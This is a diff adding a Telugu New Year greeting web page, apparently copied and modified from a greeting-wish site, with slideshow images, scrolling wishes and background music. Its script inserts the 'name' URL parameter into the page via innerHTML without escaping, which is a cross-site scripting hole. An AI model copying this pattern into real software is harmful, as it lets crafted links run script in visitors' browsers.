+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+  </marquee>
+
+  <div class="mainContainer">
+    <div class="innerContainer">      
+
+      <div data-video="https://youtu.be/PoVIpQv810s" data-starttime="35" id="youtube-audio"></div>
+      <audio src="./assets/audio/defaultSong.mp3" loop id="defaultSong"></audio> 
+      
+      <!-- <div style="animation: swing 4s infinite;">
+        <h1 style="background: url(Pics/back.gif);-webkit-text-fill-color: transparent;-webkit-background-clip: text;"
+          id="name"></h1>
+      </div> -->
+      
+      <!-- <img src="./assets/images/tlnew1.png" width="70%" height="auto" style="animation: pulse 2s infinite"><br> -->
+
+      <br>
+      
+      <div style="font-size: 10px; font-weight: 550; color: black;">
+        <!-- Timer -->
+        <!-- <p id="demo">0<font color="red"> రోజు,</font> 12<font color="red"> గంటలు,</font> 25<font color="red"> నిమిషం<br>
+          </font> 10<font color="red"> సెకన్లు </font> ప్రథమ</p> -->
+        <img src="./assets/images/tlha.png" width="85%" height="auto" style="animation: pulse 2s infinite">
+        <br>
+        <br>
+        <br><br>
+        <center>
+          <div class="w3-content w3-section" style="max-width:500px">
+            <img class="mySlides" src="./assets/images/ha3.png"
+              style="width: 250px; height: 250px; animation: 1s ease 0s infinite normal none running pulse; display: none;">
+            <img class="mySlides" src="./assets/images/ha4.png" "="" style=" width: 250px; height: 250px; animation:
+              1s ease 0s infinite normal none running pulse; display: none;">            
+            <img class="mySlides" src="./assets/images/ha5.png" "="" style=" width: 250px; height: 250px; animation:
+              1s ease 0s infinite normal none running pulse; display: block;">
+          </div>
+        </center>
+        <br>
+        <div class="wishMessage"
+          style="text-shadow: 1px 1px 3px white, 1px 1px 3px white, -1px -1px 3px white, -1px -1px 3px white;">
+          <span
+            style="text-shadow: 1px 1px 3px black, 1px 1px 3px #ff0037, -1px -1px 3px black, -1px -1px 3px black;color:#C619F9;">ఈ
+            నూతన సంవత్సరంలో</span><br>
+          <span
+            style="text-shadow: 1px 1px 3px black, 1px 1px 3px #ff0037, -1px -1px 3px black, -1px -1px 3px black;color:#FF8C00"> మీ కుటుంబంలో ప్రేమ, ఐక్యత</span><br>
+          <span
+            style="text-shadow: 1px 1px 3px black, 1px 1px 3px  #ff0037, -1px -1px 3px black, -1px -1px 3px black;color:yellow">మరియు సంతోషం కలిగి ఉండాలని కోరుచు!</span><br>
+          <p></p>
+          <div class="fivepxtop main-msg white">
+            <span
+              style="text-shadow: 1px 1px 3px #ff0037, 1px 1px 3px #ff0037, -1px -1px 3px #ff0037, -1px -1px 3px #ff0037;color: #FFC107;">నూతన
+              సంవత్సర శుభాకాంక్షలు!!</span>
+          </div>
+          <br>
+          <div
+            style="background-color: red; border-radius: 17px; border: 0px solid rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.2) 5px 5px 5px; color: black; font-family: arial, sans-serif; font-size: 18px; font-stretch: normal; font-style: normal; font-variant: normal; line-height: normal; margin: 0px auto; padding: 4px 5px 3px; width: 80%;">
+            <marquee behavior="scroll"><b>
+                మీకు మరియు మీ కుటుంబ సభ్యులకు నూతన సంవత్సర శుభాకాంక్షలు!</b></marquee>
+          </div>
+          <br>
+          <div id="name" class="glow"></div>
+
+          <div class="wishMessage">
+            Made with <span style="color: red">&hearts;</span> by John Kiran
+          </div>
+      
+          <!-- <form method="POST" action="https://hearwish.com/2O22tl/ready.php">
+            <div class="enter-name">
+              <input class="animated pulse infinite" type="name" required="" maxlength="50" name="n"
+                placeholder="👉 మీ పేరును నమోదు చేయండి">
+              <button class="btn animated shake infinite" type="submit">చూడండి</button>
+            </div>
+          </form> -->
+          <script>
+            var url_string = window.location.href;
+            var url = new URL(url_string);
+            var name = url.searchParams.get("name");
+          
+            if(name != "null" && name != undefined && name != "" && name != null) {
+                document.getElementById("name").innerHTML = name;
+            }
+
+            var youtubeurl = url.searchParams.get("youtubeurl");
+            var startTime = url.searchParams.get("starttime");
+            var player;
+
+            var myAudio = document.getElementById("defaultSong");
+            var isPlaying = false;
+
+            function toggleDefaultSong() {
+                isPlaying ? myAudio.pause() : myAudio.play();
+            };
+
+            myAudio.onplaying = function() {
+                isPlaying = true;
+            };
+
+            myAudio.onpause = function() {
+                isPlaying = false;
+            };
+
+            function onYouTubeIframeAPIReady() {
+                if(youtubeurl) {
+                    var ctrlq = document.getElementById("youtube-audio");
+                    ctrlq.innerHTML = '<div id="youtube-player"></div>';
+                    player = new YT.Player('youtube-player', {
+                        height: '0',
+                        width: '0',
+                        videoId: youtubeurl.replace("https://youtu.be/", ""),
+                        playerVars: {
+                            autoplay: 0,
+                            loop: 1,
+                            start: startTime ? startTime : 0
+                        },
+                        events: {
+                            'onReady': onPlayerReady
+                        } 
+                    });
+                }
+            } 
+
+            function toggleAudio() {
+                console.log("called"); 
+                if(youtubeurl) {
+                    if ( player.getPlayerState() == 1 || player.getPlayerState() == 3 ) {
+                        player.pauseVideo(); 
+                    } else {
+                        player.playVideo();                
+                    } 
+                } else {
+                    toggleDefaultSong();
+                }
+            } 
+        
+            function onPlayerReady(event) {
+                player.setPlaybackQuality("small");
+                document.getElementById("youtube-audio").style.display = "block";            
+            }
+          
+            var myIndex = 0; function carousel() { var e, l = document.getElementsByClassName("mySlides"); for (e = 0; e < l.length; e++)l[e].style.display = "none"; ++myIndex > l.length && (myIndex = 1), l[myIndex - 1].style.display = "block", setTimeout(carousel, 2e3) } carousel();
+
+            // // Set the date we're counting down to
+            // var countDownDate = new Date("1 January, 2022 00:00:00").getTime();
+
+            // // Update the count down every 01 second
+            // var x = setInterval(function () {
+
+            //   // Get todays date and time
+            //   var now = new Date().getTime();
+
+            //   // Find the distance between now an the count down date
+            //   var distance = countDownDate - now;
+
+            //   // Time calculations for days, hours, minutes and seconds
+            //   var days = Math.floor(distance / (1000 * 60 * 60 * 24));
+            //   var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+            //   var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+            //   var seconds = Math.floor((distance % (1000 * 60)) / 1000);
+
+            //   // Display the result in the element with id="demo"
+            //   document.getElementById("demo").innerHTML = days + "<font color='red'> రోజు,</font> " + hours + "<font color='red'> గంటలు,</font> "
+            //     + minutes + "<font color='red'> నిమిషం<br></font> " + seconds + "<font color='red'> సెకన్లు </font> ప్రథమ";
+
+            //   // If the count down is finished, write some text 
+            //   if (distance < 0) {
+            //     clearInterval(x);
+            //     document.getElementById("demo").innerHTML = "";
+            //   }
+            // }, 1000);
+          </script>
+        </div>
+
+      </div>
+    </div>
+  </div>
+ 
+</body>
+
+<!-- saved and modified from from url=(0057)https://hearwish.com/2O22tl/?n=%E0%B0%AE%E0%B1%80-Joseph# -->
+</html>
